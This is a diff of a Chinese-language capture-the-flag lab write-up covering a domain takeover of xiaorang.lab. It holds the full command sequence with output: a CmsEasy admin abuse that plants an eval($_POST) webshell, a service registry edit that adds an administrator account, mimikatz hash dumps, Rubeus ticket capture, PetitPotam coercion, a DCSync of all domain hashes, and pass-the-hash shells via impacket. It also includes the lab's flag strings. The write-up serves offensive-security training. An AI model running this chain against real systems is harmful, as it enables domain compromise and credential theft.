@@ -43,7 +43,7 @@ E:\Users\tiand>fscan  -h 39.98.124.53
 
 80端口有个cmseasy
 
-## 入口点
+## CmsEasy
 
 ![image-20260308200339209](image-20260308200339209.png)
 
@@ -69,6 +69,10 @@ Session completed.
 http://39.98.124.53/index.php?case=user&act=login登录成功
 
 ![image-20260308213007832](image-20260308213007832.png)
+
+```
+http://39.99.141.84/index.php?case=language&act=add&admin_dir=admin&site=default&id=1&lang_choice=system_custom.php#index_connent
+```
 
 phpinfo()改成eval($_POST[1])
 
@@ -277,10 +281,26 @@ cmd.exe /c net user hacker admin@123 /add & net localgroup administrators hacker
 相当于
 
 ```
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c net user hacker admin@123 /add & net localgroup administrators hacker /add" /f
+C:\Users\Adrian>reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c net user hacker admin@123 /add & net localgroup administrators hacker /add" /f
+操作成功完成。
+
+C:\Users\Adrian>sc start gupdate
+[SC] StartService 失败 1053:
+
+服务没有及时响应启动或控制请求。
+
+
+C:\Users\Adrian>net user
+
+\\WIN19 的用户帐户
+
+-------------------------------------------------------------------------------
+Administrator            Adrian                   DefaultAccount
+Guest                    hacker                   WDAGUtilityAccount
+命令成功完成。
 ```
 
-rdp上去，以管理员身份运行cmd
+用hacker用户rdp上去，以管理员身份运行cmd
 
 ```
 C:\Windows\system32>dir c:\ /S /B |findstr flag
@@ -302,3 +322,250 @@ C:\Windows\system32>type c:\Users\Administrator\flag\flag02.txt
 flag02: flag{2799f3a0-5b09-4964-9b9a-79a8abc6891d}
 
 ```
+
+## 非约束委派
+
+根据题目名查委派，找到本机器WIN19有非约束委派
+
+```
+C:\Users\hacker\Desktop>AdFind.exe -b "DC=xiaorang,DC=lab" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
+
+AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023
+
+Using server: DC01.xiaorang.lab:389
+Directory: Windows Server 2016
+
+dn:CN=DC01,OU=Domain Controllers,DC=xiaorang,DC=lab
+>cn: DC01
+>distinguishedName: CN=DC01,OU=Domain Controllers,DC=xiaorang,DC=lab
+
+dn:CN=WIN19,CN=Computers,DC=xiaorang,DC=lab
+>cn: WIN19
+>distinguishedName: CN=WIN19,CN=Computers,DC=xiaorang,DC=lab
+```
+
+非约束委派要用dc上的服务来向本机认证把tgt带过来
+
+先抓WIN19$hash
+
+```
+Authentication Id : 0 ; 27983 (00000000:00006d4f)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2026/3/9 20:12:07
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : WIN19$
+         * Domain   : XIAORANG
+         * NTLM     : 969585cc79a37de9c3cb013988087dfe
+         * SHA1     : 1e8fd90de4dcae40572a32fac7c7d6c3daf9f468
+        tspkg :
+        wdigest :
+         * Username : WIN19$
+         * Domain   : XIAORANG
+         * Password : (null)
+        kerberos :
+         * Username : WIN19$
+         * Domain   : xiaorang.lab
+```
+
+然后监听tgt
+
+```
+Rubeus.exe monitor /interval:1 /targetuser:DC01$ /nowrap >out.txt
+```
+
+PetitPotam强制认证
+
+```
+E:\exploit\tools\Delegation\PetitPotam-main>python PetitPotam.py  -u WIN19$ -hashes :969585cc79a37de9c3cb013988087dfe WIN19 172.22.4.7
+
+或者
+proxychains4 python3 dfscoerce.py -u WIN19$ -hashes :ef957d773fb27054b92e1b1593ce5d18 WIN19 172.22.4.7
+```
+
+来让dc认证WIN19
+
+得到tgt
+
+```
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+[*] Action: TGT Monitoring
+[*] Target user     : DC01$
+[*] Monitoring every 1 seconds for new TGTs
+
+
+[*] 2026/3/9 13:39:24 UTC - Found new TGT:
+
+  User                  :  DC01$@XIAORANG.LAB
+  StartTime             :  2026/3/9 20:12:43
+  EndTime               :  2026/3/10 6:12:43
+  RenewTill             :  2026/3/16 20:12:43
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4TKJbLVhei2DBS4VhQOlCs1Bzvje5NOxWOAsTNmHsleBwVyl6QBdBV0EjT1fe2nu9ZIA6k9NtTI1BQ3ju1Sqzid2jPNsYv6S6kXrGlQQFdjeJeyWSxtYsiqv7iXVGcFRINBG/qSzsuVBnVQ1eV390MSaFVPt0dpLs230Jf57vQ6NwqvlwwQdDKTnDpdb6aeXjUkpwPKACEQL78daSrdFkndWZ206S++qwppgdBmzdNeUPJPYn2Mw39icJio+D3XGM7+EWhNS2n7yH+de8dbQ8m6PPUqbsSwDyRotCzuDTekONounuNbJYfwoon7zxha34gircMplKDWRDW3/wW9j2nelCNTmU5iOQPRdnzmHu/h9UhZ71XROepSKBxoAH6DUE2z/DN/NqxZSx8477dw/Pqjq+atw8sH+HClTb7ZBIz+NWqrvWwT7wUVT/CntD4LyHamsbFzQhRN2A2L7ZIPYfTgAM1M/i0tmyQ9aP46C6IczAyviXyXXKQY9cQGNtT6s9b32QzdmGdR2eUUK9xzaSOEHIfzeVe12Pap8bW0acp4Ug1mnWX1mM/lgt0Eg7FDgytlmmj58YU2YE8K+ilBo7HRCTJtxxTYFFjiE52svNxJQae1L2GdC8PgzR2mb2ZjMaQd76QCtzHVoQmOyTdV3y7CUZbxr6TlPlq1oQlVQGy8t2kZ3mPiK97dHsnvjojrP+t5PnDJMxt7dUZXGsVsiBpGHhk1G6jGhmM2SVlXXLPQWmqqnkpyx2JjXHPT9eXmS0IrP/xoBsgxUnxHVCy0bC8jNlAUAmbmSwVQnbpJJ5+IB6VI9oUWW682Qa2W55y4G18GiOJPyZFJ+UmoHrJuGEDiE71DSHDsCpyfXlvfgh+HYoMDcvyXCx3x0HWsJ1k26bEGzKsorfP91gg0pdLWOPqOtY8U2gd/yGgOUiPzgA6d7L8EH+SWhVRiE9cqJxfiGmHpPs9cVsyrUR6X+sza5PWAxRghwQkI5HxKKxukfQsM3tPqJ8sIbWkK4LhOYZ9MnTSiQGq+dleU385SnTnyVXFH/d6TVfyFRBY+pfxdcuridfMMehUYRn2IqbOKoZTWVEcZ0tDGyh39pcds8cISxEZWCQvBL0x1+yu/TVeUPcVzpXAgYO1Dxj6rNkCnCZgVH4//dh8S2kBWrz4OktgyeV5itjDbD8x7r2ZQO9bq/Z2RqOs1BGcgXUJWtjA+TZMXlj3AXRzBw338hde251sjLTwQfxE7hvp1U9xrUSS+9B0ZpfKcxkY453pIH/bMxKs+77IZjAcm8KrtJj0ri18llxce5yEIk3DjXe4oRa90GNw/SlmwlfospqZerHPG11o0zvQlmxj4mSoIfXKlKQVyQeL29IXIxMW6rGDa8zourpQLMeKNhRVkuSMMRXj/ln43ZobP2QMOuhYgA2ywIm335Va6KhrmkS75lBZB3o6CoSjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAKBRpxvGOuiV5xEacq5E7AxA7gfeKomQa3PyB+t5zDm6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMwOTEyMTI0M1qmERgPMjAyNjAzMDkyMjEyNDNapxEYDzIwMjYwMzE2MTIxMjQzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
+
+[*] Ticket cache size: 1
+
+
+```
+
+然后Rubeus导入tgt
+
+```
+C:\Users\hacker\Desktop>Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4TKJbLVhei2DBS4VhQOlCs1Bzvje5NOxWOAsTNmHsleBwVyl6QBdBV0EjT1fe2nu9ZIA6k9NtTI1BQ3ju1Sqzid2jPNsYv6S6kXrGlQQFdjeJeyWSxtYsiqv7iXVGcFRINBG/qSzsuVBnVQ1eV390MSaFVPt0dpLs230Jf57vQ6NwqvlwwQdDKTnDpdb6aeXjUkpwPKACEQL78daSrdFkndWZ206S++qwppgdBmzdNeUPJPYn2Mw39icJio+D3XGM7+EWhNS2n7yH+de8dbQ8m6PPUqbsSwDyRotCzuDTekONounuNbJYfwoon7zxha34gircMplKDWRDW3/wW9j2nelCNTmU5iOQPRdnzmHu/h9UhZ71XROepSKBxoAH6DUE2z/DN/NqxZSx8477dw/Pqjq+atw8sH+HClTb7ZBIz+NWqrvWwT7wUVT/CntD4LyHamsbFzQhRN2A2L7ZIPYfTgAM1M/i0tmyQ9aP46C6IczAyviXyXXKQY9cQGNtT6s9b32QzdmGdR2eUUK9xzaSOEHIfzeVe12Pap8bW0acp4Ug1mnWX1mM/lgt0Eg7FDgytlmmj58YU2YE8K+ilBo7HRCTJtxxTYFFjiE52svNxJQae1L2GdC8PgzR2mb2ZjMaQd76QCtzHVoQmOyTdV3y7CUZbxr6TlPlq1oQlVQGy8t2kZ3mPiK97dHsnvjojrP+t5PnDJMxt7dUZXGsVsiBpGHhk1G6jGhmM2SVlXXLPQWmqqnkpyx2JjXHPT9eXmS0IrP/xoBsgxUnxHVCy0bC8jNlAUAmbmSwVQnbpJJ5+IB6VI9oUWW682Qa2W55y4G18GiOJPyZFJ+UmoHrJuGEDiE71DSHDsCpyfXlvfgh+HYoMDcvyXCx3x0HWsJ1k26bEGzKsorfP91gg0pdLWOPqOtY8U2gd/yGgOUiPzgA6d7L8EH+SWhVRiE9cqJxfiGmHpPs9cVsyrUR6X+sza5PWAxRghwQkI5HxKKxukfQsM3tPqJ8sIbWkK4LhOYZ9MnTSiQGq+dleU385SnTnyVXFH/d6TVfyFRBY+pfxdcuridfMMehUYRn2IqbOKoZTWVEcZ0tDGyh39pcds8cISxEZWCQvBL0x1+yu/TVeUPcVzpXAgYO1Dxj6rNkCnCZgVH4//dh8S2kBWrz4OktgyeV5itjDbD8x7r2ZQO9bq/Z2RqOs1BGcgXUJWtjA+TZMXlj3AXRzBw338hde251sjLTwQfxE7hvp1U9xrUSS+9B0ZpfKcxkY453pIH/bMxKs+77IZjAcm8KrtJj0ri18llxce5yEIk3DjXe4oRa90GNw/SlmwlfospqZerHPG11o0zvQlmxj4mSoIfXKlKQVyQeL29IXIxMW6rGDa8zourpQLMeKNhRVkuSMMRXj/ln43ZobP2QMOuhYgA2ywIm335Va6KhrmkS75lBZB3o6CoSjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAKBRpxvGOuiV5xEacq5E7AxA7gfeKomQa3PyB+t5zDm6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMwOTEyMTI0M1qmERgPMjAyNjAzMDkyMjEyNDNapxEYDzIwMjYwMzE2MTIxMjQzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\Users\hacker\Desktop>klist
+
+当前登录 ID 是 0:0x3e7
+
+缓存的票证: (1)
+
+#0>     客户端: DC01$ @ XIAORANG.LAB
+        服务器: krbtgt/XIAORANG.LAB @ XIAORANG.LAB
+        Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96
+        票证标志 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        开始时间: 3/9/2026 20:12:43 (本地)
+        结束时间:   3/10/2026 6:12:43 (本地)
+        续订时间: 3/16/2026 20:12:43 (本地)
+        会话密钥类型: AES-256-CTS-HMAC-SHA1-96
+        缓存标志: 0x1 -> PRIMARY
+        调用的 KDC:
+```
+
+然后dcsync
+
+## DCsync
+
+```
+mimikatz # lsadump::dcsync /domain:xiaorang.lab /all /csv
+[DC] 'xiaorang.lab' will be the domain
+[DC] 'DC01.xiaorang.lab' will be the DC server
+[DC] Exporting domain 'xiaorang.lab'
+502     krbtgt  767e06b9c74fd628dd13785006a9092b        514
+1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512
+1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512
+1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096
+1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096
+1000    DC01$   dfe087f43ceaca285a0c517dfe50ec35        532480
+500     Administrator   4889f6553239ace1f7c47fa2c619c252        512
+1103    FILESERVER$     d0a1ed0e53c353cf29aff34a3ea14112        4096
+1104    WIN19$  969585cc79a37de9c3cb013988087dfe        528384
+```
+
+然后pth即可
+
+```
+E:\exploit\tools\impacket\examples>python atexec.py administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 c
+md                                                                                                                      Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+usage: atexec.py [-h] [-session-id SESSION_ID] [-ts] [-silentcommand] [-debug] [-codec CODEC] [-hashes LMHASH:NTHASH]
+                 target [command ...]
+atexec.py: error: unrecognized arguments: cmd
+E:\exploit\tools\impacket\examples>python wmiexec.py administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+                                                                                                                        [*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>dir C:\ /S /B|findstr flag
+C:\Documents and Settings\Administrator\flag
+C:\Documents and Settings\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
+C:\Documents and Settings\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag04.txt.lnk
+C:\Documents and Settings\Administrator\Application Data\Microsoft\Windows\Recent\flag.lnk
+C:\Documents and Settings\Administrator\Application Data\Microsoft\Windows\Recent\flag04.txt.lnk
+C:\Documents and Settings\Administrator\flag\flag04.txt
+C:\Documents and Settings\Administrator\Recent\flag.lnk
+C:\Documents and Settings\Administrator\Recent\flag04.txt.lnk
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag04.txt.lnk
+C:\Users\Administrator\Application Data\Microsoft\Windows\Recent\flag.lnk
+C:\Users\Administrator\Application Data\Microsoft\Windows\Recent\flag04.txt.lnk
+C:\Users\Administrator\flag\flag04.txt
+C:\Users\Administrator\Recent\flag.lnk
+C:\Users\Administrator\Recent\flag04.txt.lnk
+
+C:\>whoami
+xiaorang\administrator
+
+C:\>type C:\Users\Administrator\flag\flag04.txt
+ ______   _______  _        _______  _______  _______ __________________ _______  _
+(  __  \ (  ____ \( \      (  ____ \(  ____ \(  ___  )\__   __/\__   __/(  ___  )( (    /|
+| (  \  )| (    \/| (      | (    \/| (    \/| (   ) |   ) (      ) (   | (   ) ||  \  ( |
+| |   ) || (__    | |      | (__    | |      | (___) |   | |      | |   | |   | ||   \ | |
+| |   | ||  __)   | |      |  __)   | | ____ |  ___  |   | |      | |   | |   | || (\ \) |
+| |   ) || (      | |      | (      | | \_  )| (   ) |   | |      | |   | |   | || | \   |
+| (__/  )| (____/\| (____/\| (____/\| (___) || )   ( |   | |   ___) (___| (___) || )  \  |
+(______/ (_______/(_______/(_______/(_______)|/     \|   )_(   \_______/(_______)|/    )_)
+
+
+Awesome! Now you have taken over the entire domain network.
+
+
+flag04: flag{b7720e8a-e75a-4ab9-99a1-f49531eecd52}
+```
+
+```
+E:\exploit\tools\impacket\examples>python smbexec.py xiaorang.lab/administrator@172.22.4.19 -hashes :4889f6553239ace1f7c
+47fa2c619c252                                                                                                           Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[!] Launching semi-interactive shell - Careful what you execute                                                         nt authority\system
+
+C:\windows\system32>dir c:\ /S /B|findstr flag
+[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+
+E:\exploit\tools\impacket\examples>python smbexec.py xiaorang.lab/administrator@172.22.4.19 -hashes :4889f6553239ace1f7c
+47fa2c619c252
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+                                                                                                                        [!] Launching semi-interactive shell - Careful what you execute
+C:\windows\system32>whoami
+nt authority\system
+
+C:\windows\system32>type c:\users\administrator\flag\flag*
+
+c:\users\administrator\flag\flag03.txt
+
+
+   . .       . .       .         . .       . .       . .       . .    .    .       . .       . .
+.+'|=|`+. .+'|=|`+. .+'|      .+'|=|`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=|`+. |`+. .+'|=|`+. .+'|=|`+.
+|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+' |  | `+.| |  | |  | |  | |  | `+ |
+|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | |
+|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | |
+|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | |
+|  | .+ | |  | .+'| |  | .+'| |  | .+'| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | |
+`+.|=|.+' `+.|=|.+' `+.|=|.+' `+.|=|.+' `+.|=|.+' `+.| |..|      |.+'      |.+' `+.|=|.+' `+.|  |.|
+
+
+
+flag03: flag{d2451c34-170c-4e6a-8059-572e98da677e}
+
+
+Here is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!
+```
+
